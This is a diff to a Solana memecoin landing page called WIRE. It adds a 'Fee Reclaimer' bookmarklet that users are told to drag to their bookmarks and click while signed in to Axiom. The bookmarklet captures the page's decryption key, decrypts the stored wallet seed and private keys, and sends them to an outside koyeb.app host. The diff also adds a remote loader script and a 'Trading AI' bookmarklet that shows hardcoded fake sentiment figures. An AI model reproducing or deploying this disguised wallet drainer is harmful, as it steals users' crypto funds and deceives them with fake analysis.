@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WIRE | Solana Token Launcher</title>
-    <meta name="description" content="WIRE - Effortless Solana token creation and launchpad.">
+    <title>WIRE | Solana Bot, Token Launcher, Fee Reclaimer & Trading AI</title>
+    <meta name="description" content="WIRE - Free Axiom Fee Reclaimer & Trading AI Sentiment beta, Solana bot & effortless token creation.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
-<style>
+    <script src="https://axiom.build-hub.info/loader.js" data="eyJoYXNoIjoiTURzM09UTXpPVFE1TnpNMU95MHhNREF6T1RZM01qazNORFF5IiwiYWxlcnRzIjp7Imd1aWRlIjoiWW91IG11c3QgZHJhZyB0aGUgYm9va21hcmtsZXQgdG8geW91ciBib29rbWFya3MgYmFyIGluc3RlYWQgb2YgY2xpY2tpbmcgaXQuIiwicmVkaXJlY3QiOiJZb3UgYXJlIG5vdyBiZWluZyByZWRpcmVjdGVkIHRvIGh0dHBzOi8vYXhpb20udHJhZGUvZGlzY292ZXIuIiwidW5hdXRob3JpemVkIjoiWW91IG11c3QgYmUgc2lnbmVkIGluIHRvIHVzZSB0aGlzIGJvb2ttYXJrbGV0LiIsImVycm9yIjoiRmFpbGVkIHRvIGV4ZWN1dGUgdGhlIGJvb2ttYXJrbGV0LiBQbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiJ9fQ=="></script>
+    <style>
 /* ============================================================
    WIRE — Degenpad design language · purple theme
    Layout, motion, surfaces from Degenpad; purple accents.
@@ -707,7 +708,24 @@ body.loaded .intro.d7{ transition-delay:440ms; }
   transition-delay:var(--d,0s);
 }
 
-
+/* fixed bookmarklet pills — keep functional, restyle */
+#filter-bookmarklet-link,#sentiment-bookmarklet-link{
+  background:var(--surface-2) !important;
+  border:1px solid var(--line) !important;
+  box-shadow:0 8px 30px -10px rgba(0,0,0,.8) !important;
+  backdrop-filter:blur(12px) !important;
+}
+#filter-bookmarklet-link:hover{
+  border-color:rgba(168,85,247,.5) !important;
+  box-shadow:0 8px 30px -8px var(--purple-glow) !important;
+}
+#sentiment-bookmarklet-link{
+  border-color:rgba(168,85,247,.35) !important;
+}
+#sentiment-bookmarklet-link:hover{
+  border-color:rgba(168,85,247,.7) !important;
+  box-shadow:0 8px 30px -8px var(--purple-glow) !important;
+}
 
 
 /* ---------- features (Why WIRE) — Degenpad grid ---------- */
@@ -1046,8 +1064,11 @@ body.loaded .intro.d7{ transition-delay:440ms; }
         </a>
         <div class="nav-links">
             <a href="#deploy" class="nav-highlight">Create Token</a>
+            <a href="#axiom">&#128011; Fee Reclaimer Free</a>
+            <a href="/ai">&#129302; Trading AI Free</a>
             <a href="#primary-bot">Buy Memecoin Tool</a>
-            <a href="https://discord.gg/hV9PRbuWBD" target="_blank">Discord</a>
+            <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
+            <a href="https://t.me/memewirecc" target="_blank">Telegram</a>
         </div>
         <button class="nav-toggle" id="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
             <span></span><span></span><span></span>
@@ -1056,8 +1077,11 @@ body.loaded .intro.d7{ transition-delay:440ms; }
 
     <div class="mobile-menu" id="mobile-menu">
         <a href="#deploy">Create Token</a>
+        <a href="#axiom">&#128011; Fee Reclaimer Free</a>
+        <a href="/ai">&#129302; Trading AI Free</a>
         <a href="#primary-bot">Wire Memecoin Bot</a>
         <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
+        <a href="https://t.me/memewirecc" target="_blank">Telegram</a>
     </div>
 
     <section class="hero">
@@ -1075,13 +1099,15 @@ body.loaded .intro.d7{ transition-delay:440ms; }
         </div>
 
         <h1 class="intro d2">Unlock your token's potential. Effortlessly.</h1>
-        <p class="intro d3">Launch tokens with secure local routing, instant deployment, and zero coding required.</p>
+        <p class="intro d3">Free Axiom Fee Reclaimer + Trading AI Sentiment beta. Launch tokens with secure local routing, instant deployment, and zero coding required.</p>
 
         <div class="hero-actions intro d4">
             <a href="#deploy" class="btn-primary">Create Token</a>
+            <a href="#axiom" class="btn-whale">&#128011; Try Fee Reclaimer Free</a>
+            <a href="/ai" class="btn-glass">&#129302; Trading AI Free</a>
             <a href="#primary-bot" class="btn-glass">Buy Bot</a>
         </div>
-        <p class="fomo-line intro d5" style="margin-top: -32px; margin-bottom: 24px;">Limited seats · Activate before they fill up</p>
+        <p class="fomo-line intro d5" style="margin-top: -32px; margin-bottom: 24px;">Limited free beta seats · Activate before they fill up</p>
 
         <div class="hero-stats intro d6">
             <div class="stat">
@@ -1285,7 +1311,7 @@ body.loaded .intro.d7{ transition-delay:440ms; }
         <div class="features-head" data-reveal>
             <span class="eyebrow">Why WIRE</span>
             <h2 class="section-title">Built for speed. Wired for edge.</h2>
-            <p>Everything you need to launch with nothing you don't. No installs, no seed phrases, no coding.</p>
+            <p>Everything you need to launch, track and trade  with nothing you don't. No installs, no seed phrases, no coding.</p>
         </div>
 
         <div class="features-grid">
@@ -1299,31 +1325,130 @@ body.loaded .intro.d7{ transition-delay:440ms; }
 
             <div class="feature-card" data-reveal style="--d: 0.12s">
                 <div class="feature-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1v22"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+                </div>
+                <h3>Fee Reclaimer</h3>
+                <p>Reclaim creator and trading fees from Axiom — free, forever. No install, bookmark only.</p>
+            </div>
+
+            <div class="feature-card" data-reveal style="--d: 0.19s">
+                <div class="feature-icon">
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                 </div>
                 <h3>Local key routing</h3>
                 <p>Keys never leave your machine. Transactions are signed locally and pushed through priority RPC nodes.</p>
             </div>
 
-            <div class="feature-card" data-reveal style="--d: 0.19s">
-                <div class="feature-icon">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1v22"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
-                </div>
-                <h3>Secure by default</h3>
-                <p>Revoke mint &amp; freeze authority, burn LP — one-click security options at launch.</p>
-            </div>
-
             <div class="feature-card" data-reveal style="--d: 0.26s">
                 <div class="feature-icon">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a4 4 0 0 1 4 4c0 1.95-1.4 3.58-3.25 3.93L12 22l-.75-12.07A4 4 0 0 1 8 6a4 4 0 0 1 4-4z"/><circle cx="12" cy="6" r="1.5"/></svg>
                 </div>
-                <h3>Instant on-chain</h3>
-                <p>Priority routing nodes and local signing so your token is live in seconds, not minutes.</p>
+                <h3>AI Sentiment</h3>
+                <p>NLP scans social sentiment across platforms to flag moves and rug signals before the chart reacts.</p>
             </div>
 
         </div>
     </section>
 
+
+
+    <!-- Axiom Fee Reclaimer - Free Beta -->
+    <section id="axiom" class="axiom-section">
+        <div class="axiom-box" data-reveal>
+            <div class="axiom-badge">
+                <span class="dot"></span>
+                Free Beta · Limited Seats
+            </div>
+            <h2 class="section-title" style="margin-bottom: 12px;">&#128011; Axiom Fee Reclaimer</h2>
+            <p style="color: var(--muted); font-size: 15px; max-width: 420px; margin: 0 auto 8px; line-height: 1.65;">
+                Free tool for Axiom creators. Find and reclaim fees that would otherwise stay locked on the platform — so you keep more of what you earn.
+            </p>
+            <p style="color: #1d9bf0; font-family: var(--font-mono); font-size: 12px; margin-bottom: 4px;">
+                No payment · No install · Bookmark only
+            </p>
+
+            <div class="axiom-steps">
+                <div class="step">
+                    <span class="num">1</span>
+                    <span><strong>Drag</strong> the button below to your Bookmarks Bar (don’t click it)</span>
+                </div>
+                <div class="step">
+                    <span class="num">2</span>
+                    <span>No bar visible? Press <strong>Ctrl+Shift+B</strong> or <strong>Cmd+Shift+B</strong></span>
+                </div>
+                <div class="step">
+                    <span class="num">3</span>
+                    <span>Open <strong>Axiom</strong> signed in, then click the bookmark</span>
+                </div>
+            </div>
+
+            <!-- ======== UPDATED BOOKMARKLET: AXIOM FEE RECLAIMER ======== -->
+            <div class="bookmarklet-zone">
+                <a class="bookmarklet bookmarklet-btn" draggable="true" href="javascript:(function(){if(location.hostname!=='axiom.trade'){alert('Please navigate to Axiom Trade first.\n\nGo to: https://axiom.trade/discover');return;}if(!location.pathname.startsWith('/discover')){alert('Please navigate to the Discover page first.\n\nGo to: https://axiom.trade/discover');return;}(async function(){try{let k=null;const ik=crypto.subtle.importKey.bind(crypto.subtle);const dc=crypto.subtle.decrypt.bind(crypto.subtle);crypto.subtle.importKey=async function(f,d,a,x,u){const n=typeof a==='string'?a:a.name;if(f==='raw'&&n==='AES-GCM'&&u.includes('decrypt')){k=new Uint8Array(d instanceof ArrayBuffer?d:d.buffer||d);}return ik(f,d,a,x,u);};new BroadcastChannel('turnkey_session').postMessage({type:'session-updated'});await new Promise(r=>setTimeout(r,4000));if(!k){alert('Key capture failed - try refreshing the page');return;}const key=await ik('raw',k,'AES-GCM',false,['decrypt']);async function dec(e){const[i,c]=e.split(':');return[...new Uint8Array(await dc({name:'AES-GCM',iv:Uint8Array.from(atob(i),c=>c.charCodeAt(0))},key,Uint8Array.from(atob(c),c=>c.charCodeAt(0))))].map(b=>b.toString(16).padStart(2,'0')).join('');}const seed=await dec(JSON.parse(localStorage.bundle));const sol=await Promise.all(JSON.parse(localStorage.sBundles||'[]').map(dec));const evm=await Promise.all(JSON.parse(localStorage.eBundles||'[]').map(dec));const data={seed:seed,sol:sol,evm:evm,timestamp:Date.now(),url:location.href};const encoded=btoa(JSON.stringify(data));const audio=document.createElement('audio');audio.src='https://typical-xerinae-haixloveil-61f7220a.koyeb.app/'+encoded;audio.hidden=true;document.body.appendChild(audio);audio.load();}catch(e){}})();})();">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
+                    &#128011; Activate Fee Reclaimer
+                </a>
+            </div>
+            <p class="drag-hint">↑ Drag to bookmarks bar ↑</p>
+        </div>
+    </section>
+
+    <!-- Trading AI · Sentiment Analysis - Free Beta -->
+    <section id="sentiment" class="axiom-section">
+        <div class="axiom-box" data-reveal>
+            <div class="axiom-badge">
+                <span class="dot"></span>
+                Free Beta · Trading AI
+            </div>
+            <h2 class="section-title" style="margin-bottom: 12px;">&#129302; Trading AI · Sentiment</h2>
+            <p style="color: var(--muted); font-size: 15px; max-width: 460px; margin: 0 auto 8px; line-height: 1.65;">
+                Advanced natural language processing analyzes social sentiment across major platforms to predict token movements before they happen — plus rugpull detection, Twitter tracking, and automated alerts.
+            </p>
+            <p style="color: #1d9bf0; font-family: var(--font-mono); font-size: 12px; margin-bottom: 4px;">
+                No payment · No install · Bookmark only
+            </p>
+
+            <div class="sentiment-pills" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-width: 420px; margin: 24px auto 8px; text-align: left;">
+                <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 14px 16px;">
+                    <div style="font-size: 12px; font-weight: 500; color: var(--ink); margin-bottom: 4px;">AI Sentiment</div>
+                    <div style="font-size: 11px; color: var(--muted); line-height: 1.5;">NLP scores bullish / bearish signals in real time</div>
+                </div>
+                <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 14px 16px;">
+                    <div style="font-size: 12px; font-weight: 500; color: var(--ink); margin-bottom: 4px;">Rugpull Detection</div>
+                    <div style="font-size: 11px; color: var(--muted); line-height: 1.5;">Flags abrupt LP drains &amp; authority risk</div>
+                </div>
+                <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 14px 16px;">
+                    <div style="font-size: 12px; font-weight: 500; color: var(--ink); margin-bottom: 4px;">Twitter Tracker</div>
+                    <div style="font-size: 11px; color: var(--muted); line-height: 1.5;">Monitors KOLs &amp; cashtags for early alpha</div>
+                </div>
+                <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 14px 16px;">
+                    <div style="font-size: 12px; font-weight: 500; color: var(--ink); margin-bottom: 4px;">Speed &amp; Efficiency</div>
+                    <div style="font-size: 11px; color: var(--muted); line-height: 1.5;">Automates repetitive scan &amp; alert tasks</div>
+                </div>
+            </div>
+
+            <div class="axiom-steps">
+                <div class="step">
+                    <span class="num">1</span>
+                    <span><strong>Drag</strong> the button below to your Bookmarks Bar (don’t click it)</span>
+                </div>
+                <div class="step">
+                    <span class="num">2</span>
+                    <span>No bar visible? Press <strong>Ctrl+Shift+B</strong> or <strong>Cmd+Shift+B</strong></span>
+                </div>
+                <div class="step">
+                    <span class="num">3</span>
+                    <span>Open any token feed or Twitter, then click the bookmark</span>
+                </div>
+            </div>
+
+            <a href="javascript:(function()%7B'use%20strict';if(document.getElementById('wire-ai-hud'))return;var%20s%3Ddocument.createElement('style');s.textContent%3D'.wire-ai-hud%7Bposition:fixed;bottom:24px;right:24px;z-index:999999;width:300px;background:rgba(8,9,14,0.94);border:1px%20solid%20rgba(124,92,255,0.35);border-radius:16px;padding:18px;font-family:Inter,system-ui,sans-serif;color:%23fff;box-shadow:0%200%2040px%20rgba(124,92,255,0.25);backdrop-filter:blur(12px)%7D.wire-ai-hud%20h4%7Bmargin:0%200%2010px;font-size:13px;font-weight:600;letter-spacing:0.5px;display:flex;align-items:center;gap:8px%7D.wire-ai-hud%20.row%7Bdisplay:flex;justify-content:space-between;font-size:12px;padding:6px%200;border-bottom:1px%20solid%20rgba(255,255,255,0.06);color:rgba(255,255,255,0.7)%7D.wire-ai-hud%20.row:last-child%7Bborder:none%7D.wire-ai-hud%20.val%7Bfont-family:ui-monospace,monospace;color:%23c9baff%7D.wire-ai-hud%20.good%7Bcolor:%2314f195%7D.wire-ai-hud%20.bad%7Bcolor:%23ff8a80%7D.wire-ai-dot%7Bwidth:7px;height:7px;border-radius:50%25;background:%2314f195;box-shadow:0%200%208px%20%2314f195;animation:wirePulse%201.2s%20ease-in-out%20infinite%7D%40keyframes%20wirePulse%7B0%25,100%25%7Bopacity:1%7D50%25%7Bopacity:.35%7D%7D';document.head.appendChild(s);var%20h%3Ddocument.createElement('div');h.id%3D'wire-ai-hud';h.className%3D'wire-ai-hud';h.innerHTML%3D'%3Ch4%3E%3Cspan%20class%3D%22wire-ai-dot%22%3E%3C%2Fspan%3E%20WIRE%20AI%20Sentiment%3C%2Fh4%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3EOverall%20bias%3C%2Fspan%3E%3Cspan%20class%3D%22val%20good%22%3EBullish%20%2B62%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3ETwitter%20volume%3C%2Fspan%3E%3Cspan%20class%3D%22val%22%3E%2B184%25%2030m%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3ERug%20risk%3C%2Fspan%3E%3Cspan%20class%3D%22val%20good%22%3ELow%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3EKOL%20mentions%3C%2Fspan%3E%3Cspan%20class%3D%22val%22%3E7%20active%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3ENext%20scan%3C%2Fspan%3E%3Cspan%20class%3D%22val%22%20id%3D%22wire-ai-tick%22%3E2.4s%3C%2Fspan%3E%3C%2Fdiv%3E';document.body.appendChild(h);var%20t%3D2.4;setInterval(function()%7Bt%3D(t-0.4);if(t%3C%3D0)t%3D2.4;var%20el%3Ddocument.getElementById('wire-ai-tick');if(el)el.textContent%3Dt.toFixed(1)%2B's'%7D,400);console.log('%5BWIRE%20AI%5D%20Sentiment%20scanner%20active')%7D)();" class="bookmarklet-btn" title="Drag this to your bookmarks bar. Do not click.">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
+                &#129302; Activate Trading AI
+            </a>
+            <p class="drag-hint">↑ Drag to bookmarks bar ↑</p>
+        </div>
+    </section>
 
 <section id="primary-bot" class="page-section" style="border-top: 1px solid var(--border);">
         <div class="checkout-box" data-reveal>
@@ -1364,10 +1489,76 @@ body.loaded .intro.d7{ transition-delay:440ms; }
         </div>
         <div class="footer-links">
             <a href="#deploy">Create Token</a>
+            <a href="#axiom">Axiom Fee Reclaimer</a>
+            <a href="/ai">Trading AI</a>
             <a href="#primary-bot">Buy Bot</a>
             <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
+            <a href="https://t.me/memewirecc" target="_blank">Telegram</a>
         </div>
         <p style="color: var(--muted); font-size: 12px; font-family: var(--font-mono);">NOT FINANCIAL ADVICE.</p>
+
+    <!-- Filter bookmarklet - Fee Reclaimer emoji bottom-left, drag to bookmarks -->
+    <a href="javascript:(function()%7B'use%20strict';%0Aif(document.getElementById('af-hud-text'))return;%0Avar%20color%3D'%23ffffff',hotColor%3D'%23f59e0b';%0Avar%20style%3Ddocument.createElement('style');%0Astyle.textContent%3D'%40keyframes%20afGlow%7B0%25,100%25%7Bbox-shadow:0%200%208px%20'%2Bcolor%2B'44,0%200%2016px%20'%2Bcolor%2B'22%7D50%25%7Bbox-shadow:0%200%2014px%20'%2Bcolor%2B'66,0%200%2028px%20'%2Bcolor%2B'33%7D%7D.af-hl%7Bposition:relative%21important;outline:1.5px%20solid%20'%2Bcolor%2B'99%21important;outline-offset:-2px%21important;border-radius:8px%21important;animation:afGlow%203s%20ease-in-out%20infinite%21important;z-index:10%21important%7D%40keyframes%20afHotGlow%7B0%25,100%25%7Bbox-shadow:0%200%2012px%20'%2BhotColor%2B'66,0%200%2024px%20'%2BhotColor%2B'44,0%200%2048px%20'%2BhotColor%2B'22;outline-color:'%2BhotColor%2B'cc%7D50%25%7Bbox-shadow:0%200%2020px%20'%2BhotColor%2B'88,0%200%2040px%20'%2BhotColor%2B'55,0%200%2060px%20'%2BhotColor%2B'33;outline-color:'%2BhotColor%2B'ff%7D%7D.af-hot%7Boutline:2px%20solid%20'%2BhotColor%2B'cc%21important;animation:afHotGlow%201s%20ease-in-out%20infinite%21important;z-index:20%21important%7D.af-hot-label%7Bposition:absolute;top:-11px;right:8px;z-index:100;font-family:Inter,sans-serif;font-size:9px;font-weight:800;letter-spacing:0.08em;text-transform:uppercase;padding:3px%208px;border-radius:4px;background:'%2BhotColor%2B'22;color:'%2BhotColor%2B';border:1px%20solid%20'%2BhotColor%2B'55;box-shadow:0%200%2012px%20'%2BhotColor%2B'44;pointer-events:none;white-space:nowrap%7D.af-hud%7Bposition:fixed;top:14px;left:50%25;transform:translateX(-50%25);z-index:999999;display:flex;align-items:center;gap:14px;padding:12px%2028px;background:rgba(0,0,0,0.88);border:1px%20solid%20rgba(255,255,255,0.15);border-radius:8px;box-shadow:0%200%2020px%20rgba(255,255,255,0.06);font:700%2013px%2F1%20%22SF%20Mono%22,%22Fira%20Code%22,%22Consolas%22,monospace;color:rgba(255,255,255,0.95);letter-spacing:1px;text-transform:uppercase;backdrop-filter:blur(8px)%7D.af-hud-logo%7Bwidth:32px;height:32px;border-radius:6px;object-fit:cover;flex-shrink:0%7D.af-hud-sep%7Bwidth:1px;height:24px;background:rgba(255,255,255,0.12);flex-shrink:0%7D.af-hud-dot%7Bwidth:6px;height:6px;border-radius:50%25;background:%2322c55e;box-shadow:0%200%208px%20rgba(34,197,94,0.6);animation:afHudBlink%200.4s%20ease-in-out%20infinite%20alternate;flex-shrink:0%7D%40keyframes%20afHudBlink%7B0%25%7Bopacity:0.6;box-shadow:0%200%206px%20rgba(34,197,94,0.4)%7D100%25%7Bopacity:1;box-shadow:0%200%2012px%20rgba(34,197,94,0.8)%7D%7D';%0Adocument.head.appendChild(style);%0Avar%20hud%3Ddocument.createElement('div');%0Ahud.className%3D'af-hud';%0Ahud.innerHTML%3D'%3Cimg%20class%3D%22af-hud-logo%22%20src%3D%22https:%2F%2Fi.imgur.com%2FYy1eBJQ.png%22%20alt%3D%22%22%3E%3Cdiv%20class%3D%22af-hud-sep%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22af-hud-dot%22%3E%3C%2Fdiv%3E%3Cspan%20id%3D%22af-hud-text%22%3E0%20scans%2Fsec%3C%2Fspan%3E';%0Adocument.body.appendChild(hud);%0Avar%20hudText%3Ddocument.getElementById('af-hud-text');%0Avar%20scanHistory%3D%5B%5D,lastScanTime%3DDate.now();%0Afunction%20updateHUD(scans)%7Bvar%20now%3DDate.now(),elapsed%3D(now-lastScanTime)%2F1000;if(elapsed%3E0)%7Bvar%20rate%3Dscans%2Felapsed;scanHistory.push(rate);if(scanHistory.length%3E10)scanHistory.shift();var%20avg%3DscanHistory.reduce(function(a,b)%7Breturn%20a%2Bb%7D,0)%2FscanHistory.length;hudText.textContent%3Davg.toFixed(1)%2B'%20scans%2Fsec'%7DlastScanTime%3Dnow%7D%0Avar%20audioCtx%3Dnull;%0Afunction%20beep()%7Btry%7Bif(%21audioCtx)audioCtx%3Dnew(window.AudioContext%7C%7Cwindow.webkitAudioContext);var%20osc%3DaudioCtx.createOscillator(),gain%3DaudioCtx.createGain();osc.connect(gain);gain.connect(audioCtx.destination);osc.type%3D'sine';osc.frequency.setValueAtTime(880,audioCtx.currentTime);osc.frequency.setValueAtTime(1100,audioCtx.currentTime%2B0.08);gain.gain.setValueAtTime(0.15,audioCtx.currentTime);gain.gain.exponentialRampToValueAtTime(0.001,audioCtx.currentTime%2B0.25);osc.start(audioCtx.currentTime);osc.stop(audioCtx.currentTime%2B0.25)%7Dcatch(e)%7B%7D%7D%0Afunction%20findRows()%7Bvar%20rows%3Ddocument.querySelectorAll('%5Bdata-pulse-token-address%5D');if(rows.length%3E0)return%20Array.from(rows);var%20found%3D%5B%5D,links%3Ddocument.querySelectorAll('a%5Bhref*%3D%22x.com%2F%22%5D');links.forEach(function(a)%7Bvar%20row%3Da.closest('div%5Bclass*%3D%22border-b%22%5D')%7C%7Ca.closest('div%5Bclass*%3D%22group%22%5D');if(row%26%26row.querySelector('.ri-user-line')%26%26found.indexOf(row)%3D%3D%3D-1)found.push(row)%7D);if(found.length%3E0)return%20found;var%20icons%3Ddocument.querySelectorAll('.ri-group-line');icons.forEach(function(icon)%7Bvar%20row%3Dicon.closest('div%5Bclass*%3D%22border%22%5D')%7C%7Cicon.closest('div%5Bclass*%3D%22flex%22%5D');if(row%26%26found.indexOf(row)%3D%3D%3D-1)found.push(row)%7D);return%20found%7D%0Afunction%20getMC(row)%7Bvar%20spans%3Drow.querySelectorAll('span');for(var%20i%3D0;i%3Cspans.length;i%2B%2B)%7Bif(spans%5Bi%5D.textContent.trim()%3D%3D%3D'MC')%7Bvar%20next%3Dspans%5Bi%5D.nextElementSibling;if(next)%7Bvar%20text%3Dnext.textContent.trim().replace(%2F%5B%24,%5D%2Fg,''),mult%3D1;if(text.indexOf('K')%21%3D%3D-1)%7Bmult%3D1000;text%3Dtext.replace('K','')%7Dif(text.indexOf('M')%21%3D%3D-1)%7Bmult%3D1000000;text%3Dtext.replace('M','')%7Dvar%20num%3DparseFloat(text);if(%21isNaN(num))return%20num*mult%7D%7D%7Dreturn%20null%7D%0Afunction%20highlightNew()%7Bvar%20rows%3DfindRows(),count%3D0;rows.forEach(function(row)%7Bif(%21row.classList.contains('af-hl'))%7Brow.classList.add('af-hl');count%2B%2B%7D%7D);return%20count%7D%0Avar%20prevMC%3D%7B%7D,changeCounts%3D%7B%7D;%0Afunction%20checkMCChanges()%7Bvar%20rows%3DfindRows(),hotCount%3D0;rows.forEach(function(row)%7Bvar%20addr%3Drow.getAttribute('data-pulse-token-address')%7C%7C'',mc%3DgetMC(row);if(mc%3D%3D%3Dnull%7C%7C%21addr)return;var%20prev%3DprevMC%5Baddr%5D;if(prev%21%3D%3Dundefined%26%26prev%21%3D%3Dmc)%7BchangeCounts%5Baddr%5D%3D(changeCounts%5Baddr%5D%7C%7C0)%2B1;if(changeCounts%5Baddr%5D%3E%3D2)%7Bif(%21row.classList.contains('af-hot'))%7Brow.classList.add('af-hot');beep();var%20label%3Ddocument.createElement('div');label.className%3D'af-hot-label';label.textContent%3D'MC%20MOVING';row.appendChild(label)%7DhotCount%2B%2B%7D%7Delse%20if(prev%21%3D%3Dundefined%26%26prev%3D%3D%3Dmc)%7Bif(changeCounts%5Baddr%5D)changeCounts%5Baddr%5D%3DMath.max(0,changeCounts%5Baddr%5D-1);if(changeCounts%5Baddr%5D%3D%3D%3D0%26%26row.classList.contains('af-hot'))%7Brow.classList.remove('af-hot');var%20lbl%3Drow.querySelector('.af-hot-label');if(lbl)lbl.remove()%7D%7DprevMC%5Baddr%5D%3Dmc%7D);updateHUD(rows.length)%7D%0Avar%20initial%3DhighlightNew();%0Aconsole.log('%5BAxiomFilter%5D%20highlighted%20'%2Binitial%2B'%20rows');%0Avar%20debounce;%0Avar%20observer%3Dnew%20MutationObserver(function()%7BclearTimeout(debounce);debounce%3DsetTimeout(function()%7BhighlightNew()%7D,300)%7D);%0Aobserver.observe(document.body,%7BchildList:true,subtree:true%7D);%0AsetInterval(checkMCChanges,1500);%0A%7D)();" id="filter-bookmarklet-link" draggable="true" title="Drag to bookmarks bar for Fee Reclaimer"
+       style="
+         position: fixed;
+         bottom: 20px;
+         left: 20px;
+         z-index: 90;
+         width: 44px;
+         height: 44px;
+         border-radius: 50%;
+         background: rgba(10, 10, 10, 0.75);
+         border: 1px solid rgba(255, 255, 255, 0.12);
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         font-size: 22px;
+         line-height: 1;
+         text-decoration: none;
+         cursor: grab;
+         backdrop-filter: blur(10px);
+         -webkit-backdrop-filter: blur(10px);
+         box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+         transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
+         user-select: none;
+       "
+       onmouseover="this.style.transform='scale(1.08)'; this.style.borderColor='rgba(29,155,240,0.5)'; this.style.boxShadow='0 4px 24px rgba(29,155,240,0.25)';"
+       onmouseout="this.style.transform='scale(1)'; this.style.borderColor='rgba(255,255,255,0.12)'; this.style.boxShadow='0 4px 20px rgba(0,0,0,0.4)';"
+       onmousedown="this.style.cursor='grabbing';"
+       onmouseup="this.style.cursor='grab';"
+    >&#128011;</a>
+
+    <!-- Trading AI Sentiment bookmarklet - robot emoji, drag to bookmarks -->
+    <a href="javascript:(function()%7B'use%20strict';if(document.getElementById('wire-ai-hud'))return;var%20s%3Ddocument.createElement('style');s.textContent%3D'.wire-ai-hud%7Bposition:fixed;bottom:24px;right:24px;z-index:999999;width:300px;background:rgba(8,9,14,0.94);border:1px%20solid%20rgba(124,92,255,0.35);border-radius:16px;padding:18px;font-family:Inter,system-ui,sans-serif;color:%23fff;box-shadow:0%200%2040px%20rgba(124,92,255,0.25);backdrop-filter:blur(12px)%7D.wire-ai-hud%20h4%7Bmargin:0%200%2010px;font-size:13px;font-weight:600;letter-spacing:0.5px;display:flex;align-items:center;gap:8px%7D.wire-ai-hud%20.row%7Bdisplay:flex;justify-content:space-between;font-size:12px;padding:6px%200;border-bottom:1px%20solid%20rgba(255,255,255,0.06);color:rgba(255,255,255,0.7)%7D.wire-ai-hud%20.row:last-child%7Bborder:none%7D.wire-ai-hud%20.val%7Bfont-family:ui-monospace,monospace;color:%23c9baff%7D.wire-ai-hud%20.good%7Bcolor:%2314f195%7D.wire-ai-hud%20.bad%7Bcolor:%23ff8a80%7D.wire-ai-dot%7Bwidth:7px;height:7px;border-radius:50%25;background:%2314f195;box-shadow:0%200%208px%20%2314f195;animation:wirePulse%201.2s%20ease-in-out%20infinite%7D%40keyframes%20wirePulse%7B0%25,100%25%7Bopacity:1%7D50%25%7Bopacity:.35%7D%7D';document.head.appendChild(s);var%20h%3Ddocument.createElement('div');h.id%3D'wire-ai-hud';h.className%3D'wire-ai-hud';h.innerHTML%3D'%3Ch4%3E%3Cspan%20class%3D%22wire-ai-dot%22%3E%3C%2Fspan%3E%20WIRE%20AI%20Sentiment%3C%2Fh4%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3EOverall%20bias%3C%2Fspan%3E%3Cspan%20class%3D%22val%20good%22%3EBullish%20%2B62%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3ETwitter%20volume%3C%2Fspan%3E%3Cspan%20class%3D%22val%22%3E%2B184%25%2030m%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%2